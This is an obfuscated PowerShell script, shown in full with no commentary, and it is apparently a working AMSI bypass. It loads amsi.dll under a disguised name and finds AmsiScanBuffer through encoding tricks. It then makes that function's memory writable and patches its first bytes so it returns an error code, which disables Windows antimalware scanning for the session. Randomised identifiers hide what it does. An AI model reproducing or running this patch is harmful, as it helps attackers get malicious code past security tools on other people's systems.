$Zp5fbq2vxdC836 = @"
using System;
using System.Runtime.InteropServices;
public class Zp5fbq2vxdC836 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr QXzWxzLyLge, string h3ZV0UqviA0bM);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr iJCa0Z1aycFZoAWQQ, UIntPtr etbu7C3viP3b7Otu8LY, uint m1hBPld6lqD6fS9Xzl, out uint DKXGsgnrh);
}
"@

Add-Type $Zp5fbq2vxdC836

$hDBsEU7CXzNtfQXUnL = [Zp5fbq2vxdC836]::LoadLibrary("$([chAr]([BYte]0x61)+[CHar](109*98/98)+[CHaR]([byTE]0x73)+[chaR]([ByTE]0x69)+[CHAR](24+22)+[ChAR](100+35-35)+[chAR]([bYtE]0x6c)+[CHAr]([BytE]0x6c))")
$YVf0L9DOfeBXTs7 = [Zp5fbq2vxdC836]::GetProcAddress($hDBsEU7CXzNtfQXUnL, "$(('ÀmsìSc'+'änBûff'+'ér').NORmaLize([cHAR](64+6)+[chAR](85+26)+[ChAr]([bYTe]0x72)+[CHaR]([BYtE]0x6d)+[ChaR]([BYTe]0x44)) -replace [ChaR](92*68/68)+[chaR](112*75/75)+[Char](123)+[ChAR]([ByTE]0x4d)+[chaR]([ByTe]0x6e)+[cHar](125*93/93))")
$p = 0
[Zp5fbq2vxdC836]::VirtualProtect($YVf0L9DOfeBXTs7, [uint32]5, 0x40, [ref]$p)
$JTbR5sO37 = "0xB8"
$K8rbz7zpYWqvUvd = "0x57"
$grrreNFb = "0x00"
$HIfRJz = "0x07"
$cHOx = "0x80"
$m85VTZs = "0xC3"
$ouHGN5VImz3mxlh = [Byte[]] ($JTbR5sO37,$K8rbz7zpYWqvUvd,$grrreNFb,$HIfRJz,+$cHOx,+$m85VTZs)
[System.Runtime.InteropServices.Marshal]::Copy($ouHGN5VImz3mxlh, 0, $YVf0L9DOfeBXTs7, 6)